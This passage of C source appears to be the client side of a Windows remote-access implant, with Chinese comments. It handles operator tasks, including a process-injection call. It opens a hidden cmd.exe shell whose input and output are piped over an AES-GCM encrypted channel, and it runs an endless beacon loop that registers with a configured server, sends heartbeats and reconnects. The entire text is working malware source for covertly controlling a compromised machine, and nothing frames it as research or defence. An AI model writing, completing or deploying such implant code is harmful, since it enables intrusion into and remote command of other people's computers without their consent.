        else exitCode = run_process_inject(dataBuf, output, 128 * 1024);
    } else {
        snprintf(output, 128 * 1024, "unsupported task type: %s", type);
        exitCode = -1;
    }

    json_escape(output, outEsc, 160 * 1024);
    snprintf(resultJson, 128 * 1024,
        "{\"TaskID\":%llu,\"TaskType\":\"%s\",\"ExitCode\":%d,\"Output\":\"%s\",\"Error\":\"\"}",
        (unsigned long long)taskID, type, exitCode, outEsc);

    pkt_init(&pkt, TYPE_RESULT, g_sessionID);
    pkt.payload = (unsigned char *)resultJson;
    pkt.payloadLen = (int)strlen(resultJson);
    send_frame(g_sock, &pkt);

    free(resultJson);
    free(output);
    free(outEsc);
}

// ─── 交互式 Shell（Windows cmd.exe） ─────────────────────────────────
// 服务端下发 TypeShellOpen/TypeShellData/TypeShellClose 帧：
//   open  : {"shell":"cmd.exe"}         → 启动子进程，stdin/stdout/stderr 管道
//   data  : {"data":"<input>"}          → 写入 shell stdin
//   close : {}                          → 终止 shell
// 上行（shell 输出）用 TypeShellData 帧，payload {"data":"<utf8>","cwd":""}
static HANDLE g_shInW = NULL, g_shOutR = NULL, g_shOutW = NULL;
static HANDLE g_shProc = NULL;
static volatile LONG g_shRunning = 0;
static HANDLE g_shReadThread = NULL;

// shell 输出上行帧（独立线程调用）
static void shell_send_output(const char *data, int len) {
    // 需要构造 JSON 字符串：\x00CWD\x00 等控制符不处理，仅转义引号/反斜杠
    // 简化：cmd 输出不含引号/反斜杠时直接嵌入；含引号做最小转义
    char *payload = (char *)malloc(64 + len * 2 + 64);
    TSHLPacket pkt;
    char *p;
    int i;
    if (!payload || !g_sock) { if (payload) free(payload); return; }

    p = payload;
    p += sprintf(p, "{\"data\":\"");
    for (i = 0; i < len; i++) {
        if (data[i] == '"' || data[i] == '\\') { *p++ = '\\'; *p++ = data[i]; }
        else if (data[i] == '\n') { *p++ = '\\'; *p++ = 'n'; }
        else if (data[i] == '\r') { *p++ = '\\'; *p++ = 'r'; }
        else if (data[i] < 0x20) { *p++ = ' '; }
        else *p++ = data[i];
    }
    p += sprintf(p, "\",\"cwd\":\"\"}");
    (void)p;

    pkt_init(&pkt, TYPE_SHELLDATA, g_sessionID);
    pkt.payload = (unsigned char *)payload;
    pkt.payloadLen = (int)strlen(payload);
    send_frame(g_sock, &pkt);
    free(payload);
}

// shell 读线程：读 stdout+stderr → 上行
static DWORD WINAPI shell_reader(LPVOID param) {
    char buf[4096];
    DWORD n;
    (void)param;
    while (g_shRunning) {
        if (!ReadFile(g_shOutR, buf, sizeof(buf), &n, NULL) || n == 0) break;
        // GBK→UTF-8 后上行
        if (n > 0) {
            char *utf8 = (char *)malloc(n * 3 + 8);
            if (utf8) {
                // 简单转换：GBK 多字节 → UTF-8（复用 gbk_to_utf8，但它是 C-string 版）
                // 这里直接逐块转：先 NUL 终止再转
                char *tmp = (char *)malloc(n + 1);
                if (tmp) {
                    memcpy(tmp, buf, n); tmp[n] = 0;
                    gbk_to_utf8(tmp, utf8, (int)(n * 3 + 8));
                    shell_send_output(utf8, (int)strlen(utf8));
                    free(tmp);
                }
                free(utf8);
            }
        }
    }
    return 0;
}

// shell 进程退出监视线程：不阻塞 beacon 读循环
static DWORD WINAPI shell_monitor(LPVOID param) {
    HANDLE hProc = (HANDLE)param;
    DWORD rc = WaitForSingleObject(hProc, INFINITE);
    (void)rc;
    InterlockedExchange(&g_shRunning, 0);
    CloseHandle(hProc);
    if (g_shProc == hProc) g_shProc = NULL;
    if (g_shInW) { CloseHandle(g_shInW); g_shInW = NULL; }
    if (g_shOutR) { CloseHandle(g_shOutR); g_shOutR = NULL; }
    shell_send_output("\r\n[shell exited]\r\n", 19);
    return 0;
}

static void shell_open(const char *shell) {
    SECURITY_ATTRIBUTES sa;
    HANDLE hInR = NULL, hInW = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char shellPath[256];
    DWORD flags = CREATE_NO_WINDOW;

    if (g_shRunning) return; // 已在运行

    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    if (!CreatePipe(&hInR, &hInW, &sa, 0)) return;
    if (!CreatePipe(&g_shOutR, &g_shOutW, &sa, 0)) { CloseHandle(hInR); CloseHandle(hInW); return; }
    SetHandleInformation(hInW, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(g_shOutR, HANDLE_FLAG_INHERIT, 0);

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.hStdInput = hInR;
    si.hStdOutput = g_shOutW;
    si.hStdError = g_shOutW;
    si.dwFlags = STARTF_USESTDHANDLES;
    memset(&pi, 0, sizeof(pi));

    if (!shell || !*shell || strcmp(shell, "cmd") == 0 || strcmp(shell, "cmd.exe") == 0) {
        // 用绝对路径：植入端可能运行在精简 PATH 环境，相对名找不到 cmd.exe
        snprintf(shellPath, sizeof(shellPath), "C:\\Windows\\System32\\cmd.exe /Q");
    } else {
        snprintf(shellPath, sizeof(shellPath), "%s", shell);
    }

    if (!CreateProcessA(NULL, shellPath, NULL, NULL, TRUE, flags, NULL, NULL, &si, &pi)) {
        CloseHandle(hInR); CloseHandle(hInW);
        CloseHandle(g_shOutR); CloseHandle(g_shOutW);
        g_shOutR = g_shOutW = NULL;
        {
            char errmsg[64];
            snprintf(errmsg, sizeof(errmsg), "[shell open failed: %lu]", GetLastError());
            shell_send_output(errmsg, (int)strlen(errmsg));
        }
        return;
    }
    CloseHandle(hInR);
    CloseHandle(g_shOutW);
    g_shInW = hInW;
    g_shProc = pi.hProcess;
    CloseHandle(pi.hThread);
    InterlockedExchange(&g_shRunning, 1);

    // 读线程：stdout → 上行
    g_shReadThread = CreateThread(NULL, 0, shell_reader, NULL, 0, NULL);
    // 监视线程：进程退出后清理状态（不阻塞 beacon 循环）
    {
        HANDLE mt = CreateThread(NULL, 0, shell_monitor, pi.hProcess, 0, NULL);
        if (mt) CloseHandle(mt);
    }
}

static void shell_write(const char *data) {
    DWORD n;
    if (!g_shRunning || !g_shInW) return;
    WriteFile(g_shInW, data, (DWORD)strlen(data), &n, NULL);
}

static void shell_close(void) {
    if (g_shProc) {
        TerminateProcess(g_shProc, 0);
        InterlockedExchange(&g_shRunning, 0);
    }
}
// ─── beacon loop ───
static void beacon(void) {
    SOCKET s;
    struct addrinfo hints, *res = NULL, *rp;
    int conn = 0;
    char host[128], port[16];
    char *colon;
    unsigned char enc[TSHL_HDRSZ + 8192];
    unsigned char plain[TSHL_HDRSZ + 8192];
    TSHLPacket pkt;
    char regJson[512];
    time_t lastHb = 0;
    int regDone = 0;

    // parse host:port
    snprintf(host, sizeof(host), "%s", g_server);
    colon = strrchr(host, ':');
    if (!colon) { snprintf(port, sizeof(port), "8080"); }
    else { *colon = 0; snprintf(port, sizeof(port), "%s", colon + 1); }

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(host, port, &hints, &res) != 0) return;

    for (rp = res; rp; rp = rp->ai_next) {
        s = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (s == INVALID_SOCKET) continue;
        if (connect(s, rp->ai_addr, (int)rp->ai_addrlen) == 0) { conn = 1; break; }
        closesocket(s);
    }
    freeaddrinfo(res);
    if (!conn) return;

    g_sock = s;
    {
        int keep = 1;
        setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, (const char *)&keep, sizeof(keep));
    }

    // register
    pkt_init(&pkt, TYPE_REGISTER, g_sessionID);
    build_register(regJson, sizeof(regJson));
    pkt.payload = (unsigned char *)regJson;
    pkt.payloadLen = (int)strlen(regJson);
    if (!send_frame(s, &pkt)) {
        closesocket(s); g_sock = INVALID_SOCKET; return;
    }
    regDone = 1;

    lastHb = time(NULL);

    for (;;) {
        int encLen, plainLen;
        int n;
        time_t now = time(NULL);

        if (regDone && now - lastHb >= g_interval) {
            // heartbeat
            pkt_init(&pkt, TYPE_HEARTBEAT, g_sessionID);
            pkt.payload = NULL;
            pkt.payloadLen = 0;
            send_frame(s, &pkt);
            lastHb = now;
        }

        encLen = recv_frame(s, enc, sizeof(enc), 1000);
        if (encLen < 0) {
            if (encLen == -2) {
                continue; // 超时：无下行数据，继续心跳循环
            }
            break; // 断开/错误：退出 beacon 重连
        }

        plainLen = aes_gcm_decrypt(enc, encLen, plain);
        if (plainLen <= 0) continue;

        n = pkt_parse(plain, plainLen, &pkt);
        if (n < 0) continue;

        if (pkt.type == TYPE_TASK) {
            handle_task(pkt.payload, pkt.payloadLen);
        } else if (pkt.type == TYPE_SHELLOPEN) {
            // {"shell":"cmd.exe"} → 解析 shell 字段
            char j[512];
            char sh[128] = {0};
            int jl = pkt.payloadLen < (int)sizeof(j) ? pkt.payloadLen : (int)sizeof(j) - 1;
            memcpy(j, pkt.payload, jl);
            j[jl] = 0;
            {
                const char *p = strstr(j, "\"shell\":\"");
                if (p) {
                    const char *s = p + 9;
                    int o = 0;
                    while (*s && *s != '"' && o < 127) sh[o++] = *s++;
                    sh[o] = 0;
                }
            }
            shell_open(sh);
        } else if (pkt.type == TYPE_SHELLDATA) {
            // {"data":"..."} → 写 stdin
            char j[512];
            char in[256] = {0};
            int jl = pkt.payloadLen < (int)sizeof(j) ? pkt.payloadLen : (int)sizeof(j) - 1;
            memcpy(j, pkt.payload, jl);
            j[jl] = 0;
            {
                const char *p = strstr(j, "\"data\":\"");
                if (p) {
                    const char *s = p + 8;
                    int o = 0;
                    while (*s && *s != '"' && o < 255) {
                        if (*s == '\\' && (s[1] == 'n' || s[1] == 'r' || s[1] == 't')) {
                            if (s[1] == 'n') in[o++] = '\n';
                            else if (s[1] == 'r') in[o++] = '\r';
                            else in[o++] = '\t';
                            s += 2;
                        } else if (*s == '\\' && s[1] == '\\') {
                            in[o++] = '\\'; s += 2;
                        } else {
                            in[o++] = *s++;
                        }
                    }
                    in[o] = 0;
                }
            }
            shell_write(in);
        } else if (pkt.type == TYPE_SHELLCLOSE) {
            shell_close();
        } else if (pkt.type == TYPE_ACK) {
            // heartbeat ack — nothing to do
        }
    }

    closesocket(s);
    g_sock = INVALID_SOCKET;
}

// ─── main ───
int main(void) {
    WSADATA wsa;
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());

    load_config();
    aes_gcm_init();

    // session ID from time + pid (16 hex chars)
    {
        FILETIME ft;
        GetSystemTimeAsFileTime(&ft);
        g_sessionID = ((unsigned __int64)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
        g_sessionID ^= (unsigned __int64)GetCurrentProcessId();
    }

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
    if (g_interval <= 0) g_interval = 5;

    for (;;) {
        beacon();
        Sleep((DWORD)(g_retryWait > 0 ? g_retryWait : 5) * 1000);
    }

    WSACleanup();
    return 0;
}
